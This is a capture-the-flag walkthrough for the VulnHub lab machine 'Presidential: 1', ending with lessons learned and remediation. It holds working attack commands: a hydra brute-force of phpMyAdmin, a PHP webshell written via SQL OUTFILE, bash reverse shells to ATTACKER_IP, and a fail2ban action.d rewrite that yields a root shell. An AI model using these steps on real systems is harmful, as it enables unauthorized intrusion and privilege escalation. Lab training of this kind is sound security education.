# Presidential: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Medium |
| **OS** | Linux (CentOS) |
| **Author** | dibble |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/presidential-1,500/) |

## Attack Summary

`nmap` → port 80 + 2082 → `gobuster` → phpMyAdmin brute force → SQL `SELECT INTO OUTFILE` PHP webshell → reverse shell → `fail2ban` LPE via arbitrary file write to action.d → root

## Methodology

1. Network discovery
2. Web enumeration on ports 80 and 2082
3. phpMyAdmin brute force
4. PHP webshell via MySQL `OUTFILE`
5. Reverse shell
6. Privilege escalation via fail2ban action.d misconfiguration

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.X
```

Ports open: 80 (HTTP/Apache), 2082 (phpMyAdmin or alternate HTTP).

---

## Step 2: Web Enumeration

```bash
gobuster dir -u http://192.168.56.X/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
gobuster dir -u http://192.168.56.X:2082/ -w /usr/share/wordlists/dirb/common.txt
```

Find phpMyAdmin on port 2082. Also enumerate `/config.php` or source for database credentials.

---

## Step 3: phpMyAdmin Login and Webshell

Brute force or find credentials from page source / config files:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.X -s 2082 http-post-form \
  "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:Access denied"
```

Once logged in, use SQL to write a PHP webshell:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Test:
```
http://192.168.56.X/shell.php?cmd=id
```

---

## Step 4: Reverse Shell

```bash
nc -lvp 4444
```

```
http://192.168.56.X/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
```

Upgrade shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Step 5: Privilege Escalation — fail2ban Action Hijack

```bash
sudo -l
# or check fail2ban permissions:
ls -la /etc/fail2ban/action.d/

# If writable:
# fail2ban actionban executes arbitrary commands as root when a ban is triggered
# Create/modify an action file:
cat > /etc/fail2ban/action.d/iptables-multiport.conf << 'EOF'
[Definition]
actionstart = 
actionstop  = 
actioncheck = 
actionban   = /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'
actionunban = 
EOF

# Trigger a ban by failing SSH logins multiple times:
for i in {1..10}; do ssh wronguser@localhost; done
```

Catch the root shell on port 5555.

```bash
cat /root/root.txt
```

---

## Lessons Learned

1. **phpMyAdmin exposed on alternate port** — always scan all ports; admin interfaces on non-standard ports are frequently misconfigured
2. **MySQL `SELECT INTO OUTFILE`** — write access to web root via MySQL is critical; restrict `FILE` privilege and the MySQL user's directory access
3. **fail2ban writable action.d** — when fail2ban actions are world/group-writable, any user who can modify them and trigger a ban gets arbitrary root code execution
4. **Weak phpMyAdmin credentials** — enforce strong passwords and IP-restrict admin panels

## Remediation

| Vulnerability | Fix |
|---|---|
| phpMyAdmin brute-forceable | Enable 2FA; restrict access by IP; use fail2ban on it |
| MySQL FILE privilege + web root write | Revoke FILE privilege; chown web root to non-mysql user |
| fail2ban action.d writable | `chmod 750 /etc/fail2ban/action.d`; run fail2ban as dedicated user |
| Shell exposed on web root | Move webshell-susceptible paths outside document root |
